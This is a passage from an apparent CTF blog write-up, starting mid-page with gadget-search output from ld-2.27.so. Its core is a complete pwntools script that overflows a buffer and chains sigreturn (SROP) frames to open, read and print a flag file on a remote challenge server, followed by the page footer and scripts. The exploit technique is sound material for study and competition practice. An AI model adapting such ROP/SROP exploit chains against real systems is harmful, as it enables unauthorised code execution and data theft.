DT_FLAGS_1.\n&#x27;</span> */<br>ld-2.27.so      0x7ffff7df77d4 insb byte ptr [rdi], dx /* <span class="hljs-string">&#x27;flags &amp; ~(DL_LOOKUP_ADD_DEPENDENCY | DL_LOOKUP_GSCOPE_LOCK)) == 0&#x27;</span> */<br>ld-2.27.so      0x7ffff7df844e insb byte ptr [rdi], dx /* <span class="hljs-string">&#x27;flags_1 &amp; DF_1_NODELETE) == 0&#x27;</span> */<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;nepctf.1cepeak.cn&quot;</span>, <span class="hljs-number">31943</span>)<br><br>mov_eax_15 = <span class="hljs-number">0x0000400754</span>   <span class="hljs-comment">#0x0000000000400754 : mov eax, 0xf ; pop rbp ; ret</span><br>buf = <span class="hljs-number">0x00000601050</span>         <span class="hljs-comment">#.bss:0000000000601050</span><br>ret = <span class="hljs-number">0x004007AE</span>            <span class="hljs-comment">#.text:00000000004007AD C9                            leave</span><br>                            <span class="hljs-comment">#.text:00000000004007AE C3                            retn</span><br>syscall = <span class="hljs-number">0x0004005B0</span>       <span class="hljs-comment">#.plt:00000000004005B0                               ; [00000006 BYTES: COLLAPSED FUNCTION _syscall. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br>pop_rdi = <span class="hljs-number">0x0000000000400813</span>    <span class="hljs-comment">#0x0000000000400813 : pop rdi ; ret</span><br>stack = <span class="hljs-number">0x0601a50</span><br><span class="hljs-comment">#开出一个栈</span><br>frame = SigreturnFrame()<br>frame.rdi = <span class="hljs-number">0</span><br>frame.rsi = <span class="hljs-number">0</span><br>frame.rdx = stack-<span class="hljs-number">0x8</span><br>frame.rcx = <span class="hljs-number">0x1000</span><br>frame.rip = syscall<br>frame.rsp = stack<br><br>payload = <span class="hljs-string">b&quot;a&quot;</span> * (<span class="hljs-number">0x0030</span>+<span class="hljs-number">8</span>) + flat([<br>    pop_rdi,<br>    <span class="hljs-number">15</span>,<br>    syscall<br>]) + <span class="hljs-built_in">bytes</span>(frame)<br><br><br>p.send(payload)<br>sleep(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#orw</span><br>frame = SigreturnFrame()<br>frame.rdi = <span class="hljs-number">2</span><br>frame.rsi = stack-<span class="hljs-number">0x8</span><br>frame.rdx = <span class="hljs-number">0</span><br>frame.rcx = <span class="hljs-number">0x1000</span><br>frame.rip = syscall<br>frame.rsp = stack + <span class="hljs-number">0x110</span><br>payload = <span class="hljs-string">b&quot;./flag\x00\x00&quot;</span> + flat([<br>    pop_rdi,<br>    <span class="hljs-number">15</span>,<br>    syscall <br>]) + <span class="hljs-built_in">bytes</span>(frame) <br><br>frame = SigreturnFrame()<br>frame.rdi = <span class="hljs-number">0</span><br>frame.rsi = <span class="hljs-number">3</span><br>frame.rdx = stack-<span class="hljs-number">0x100</span><br>frame.rcx = <span class="hljs-number">0x40</span><br>frame.rip = syscall<br>frame.rsp = stack + <span class="hljs-number">0x110</span> + <span class="hljs-number">0x110</span><br>payload += flat([<br>    pop_rdi,<br>    <span class="hljs-number">15</span>,<br>    syscall <br>]) + <span class="hljs-built_in">bytes</span>(frame) <br><br>frame = SigreturnFrame()<br>frame.rdi = <span class="hljs-number">1</span><br>frame.rsi = <span class="hljs-number">1</span><br>frame.rdx = stack-<span class="hljs-number">0x100</span><br>frame.rcx = <span class="hljs-number">0x40</span><br>frame.rip = syscall<br>frame.rsp = stack + <span class="hljs-number">0x110</span> + <span class="hljs-number">0x110</span> + <span class="hljs-number">0x110</span><br>payload += flat([<br>    pop_rdi,<br>    <span class="hljs-number">15</span>,<br>    syscall <br>]) + <span class="hljs-built_in">bytes</span>(frame) <br><br>log.success(<span class="hljs-string">f&quot;length <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(payload):#x&#125;</span>&quot;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/25/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">Linux保护机制 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>